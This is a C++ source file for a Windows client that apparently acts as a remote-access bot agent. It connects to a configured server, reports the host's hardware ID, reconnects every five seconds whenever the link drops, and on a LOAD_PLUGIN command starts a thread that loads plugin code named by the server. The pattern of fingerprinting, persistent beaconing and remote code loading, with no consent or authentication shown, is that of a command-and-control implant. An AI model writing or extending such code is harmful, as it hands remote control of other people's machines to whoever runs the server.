#include "MainHandler.h"

SOCKET MainHandler::ServerSocket = NULL;

bool MainHandler::sendInitPacket() {
  Packet *InitPacket = new Packet(ServerSocket);
  InitPacket->setSignature(Variable::Signature::NEW_CLIENT);
  std::vector<char *> Params;

  std::string HWID = getHWID();
  Params.push_back((char *)HWID.c_str());

  InitPacket->addParam(Params);
  bool Result = InitPacket->sendPacket();

  delete InitPacket;

  return Result;
}

bool MainHandler::sendPingPacket(Packet *AlivePacket) {
  AlivePacket->setSignature(Variable::Signature::RESPONSE_SUCCESS);
  return AlivePacket->sendPacket();
}

void MainHandler::startHandler() {
  waitConnect();

  while (true) {
    Packet *AlivePacket = new Packet(ServerSocket);
    if (AlivePacket->receivePacket()) {
      bool Result = false;

      switch (AlivePacket->parseSignatureFromPayload()) {
      case Variable::Signature::PING:
        Result = true;
        break;
      case Variable::Signature::LOAD_PLUGIN: {
        std::vector<std::string> Params = AlivePacket->parseParams();
        PluginHandler *Handler = new PluginHandler(
            (char *)Params.at(1).c_str(), (char *)Params.at(2).c_str(),
            (char *)Params.at(3).c_str(), (char *)Params.at(4).c_str());
        PluginHandler::startLoadingThread(Handler);

        Result = true;
        break;
      }
      default:
        delete AlivePacket;
        waitConnect();
        break;
      }

      if (Result == true) {
        if (!sendPingPacket(AlivePacket)) {
          delete AlivePacket;
          waitConnect();
        } else {
          delete AlivePacket;
          Sleep(5000);
        }
      }
    } else {
      delete AlivePacket;
      waitConnect();
    }
  }
}

void MainHandler::handleRequest(char *Payload) {}

void MainHandler::waitConnect() {
  if (MainHandler::ServerSocket != NULL) {
    closesocket(MainHandler::ServerSocket);
  }
  while (tryConnect()) {
    Sleep(5000);
  }
  if (!sendInitPacket()) {
    waitConnect();
  }
}

bool MainHandler::tryConnect() {
  WSADATA WsaData;
  WSAStartup(MAKEWORD(2, 2), &WsaData);

  ServerSocket = NULL;
  ServerSocket = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP);

  SOCKADDR_IN ConnectAddr = {};
  ConnectAddr.sin_family = AF_INET;
  ConnectAddr.sin_port = htons(Variable::getInstance()->getPort());

  hostent *DomainInfo =
      gethostbyname(Variable::getInstance()->getServerAddress());
  LPSTR IpInfo = inet_ntoa(*(struct in_addr *)DomainInfo->h_addr_list[0]);
  ConnectAddr.sin_addr.s_addr = inet_addr(IpInfo);

  if (connect(ServerSocket, (SOCKADDR *)&ConnectAddr, sizeof(ConnectAddr)) ==
      SOCKET_ERROR) {
    return WSAGetLastError();
  }

  return 0;
}